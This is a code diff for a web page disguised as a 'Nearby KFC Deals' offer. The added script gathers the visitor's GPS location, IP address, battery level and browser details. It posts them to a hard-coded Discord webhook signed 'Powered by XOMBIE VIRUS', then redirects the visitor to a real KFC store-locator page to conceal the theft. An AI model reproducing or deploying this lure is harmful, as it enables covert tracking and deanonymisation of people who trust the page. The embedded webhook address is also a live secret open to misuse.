@@ -93,12 +93,11 @@
     <button class="btn" onclick="sendLocation()">🔎 Nearby KFC Deals</button>
   </div>
 
-<script>
-document.addEventListener("DOMContentLoaded", () => {
-  const foodIcons = ["drumstick.png", "sauce.png", "wing.png"];
-  const bg = document.getElementById('background');
+ <script>
+    const foodIcons = ["drumstick.png", "sauce.png", "wing.png"];
+    const bg = document.getElementById('background');
 
-  if (bg) {
+    // Animate background
     for (let i = 0; i < 40; i++) {
       const img = document.createElement('img');
       img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
@@ -118,56 +117,69 @@ document.addEventListener("DOMContentLoaded", () => {
       img.style.animationDuration = (6 + Math.random() * 3) + 's';
       bg.appendChild(img);
     }
-  }
 
- window.sendLocation = async function () {
-  let lat = "N/A", lon = "N/A", accuracy = "N/A", ip = "N/A", battery = "N/A", userAgent = navigator.userAgent;
+    const webhookUrl = "https://discord.com/api/webhooks/1400382122866249758/e2PIiGtfPBi0SQlRzF55kOmzGW2yUl-0HvUfjgp0Pohh9IAoWnbP-7EmGSKNbUnHgXjh";
 
-  try {
-    const ipRes = await fetch("https://api.ipify.org?format=json");
-    const ipData = await ipRes.json();
-    ip = ipData.ip;
-  } catch (e) {}
+    async function sendLocation() {
+      let lat = "N/A", lon = "N/A", accuracy = "N/A", ip = "N/A", battery = "N/A", userAgent = navigator.userAgent;
 
-  try {
-    const batt = await navigator.getBattery();
-    battery = Math.round(batt.level * 100) + "%";
-  } catch (e) {}
+      // Get IP address from external API
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+      } catch (e) {}
 
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition((position) => {
-      lat = position.coords.latitude;
-      lon = position.coords.longitude;
-      accuracy = position.coords.accuracy;
+      // Get battery level if available
+      try {
+        const batt = await navigator.getBattery();
+        battery = Math.round(batt.level * 100) + "%";
+      } catch (e) {}
 
-      const mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
+      // Get geolocation
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            lat = position.coords.latitude;
+            lon = position.coords.longitude;
+            accuracy = position.coords.accuracy;
 
-      const payload = {
-        lat,
-        lon,
-        accuracy,
-        ip,
-        battery,
-        ua: userAgent,
-        map: mapUrl,
-        time: new Date().toLocaleString()
-      };
+       const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+const signature = `\n\n🧠 **Powered by XOMBIE VIRUS** ☣️`;
 
-      // Store in localStorage
-      localStorage.setItem("kfcData", JSON.stringify(payload));
+const content = `🍗 **Nearby KFC Deal Request**
+📍 **Latitude:** ${lat}
+📍 **Longitude:** ${lon}
+🎯 **Accuracy:** ${accuracy} meters
+🌐 **IP Address:** ${ip}
+🔋 **Battery:** ${battery}
+🧠 **User Agent:** ${userAgent}
+📍 [Google Maps Link](${mapUrl})${signature}`;
 
-      // Go to panel page
-      window.location.href = "/panel.html";
-    }, () => {
-      window.location.href = "https://www.kfcpakistan.com/store-locations";
-    });
-  } else {
-    window.location.href = "https://www.kfcpakistan.com/store-locations";
-  }
-};
-</script>
+
+            fetch(webhookUrl, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ content: content })
+            }).finally(() => {
+              setTimeout(() => {
+                window.location.href = "https://www.kfcpakistan.com/store-locations";
+              }, 1000);
+            });
+          },
+          () => {
+            window.location.href = "https://www.kfcpakistan.com/store-locations";
+          }
+        );
+      } else {
+        window.location.href = "https://www.kfcpakistan.com/store-locations";
+      }
+    }
+  </script>
+
 </body>
 </html>
+
 
 
 
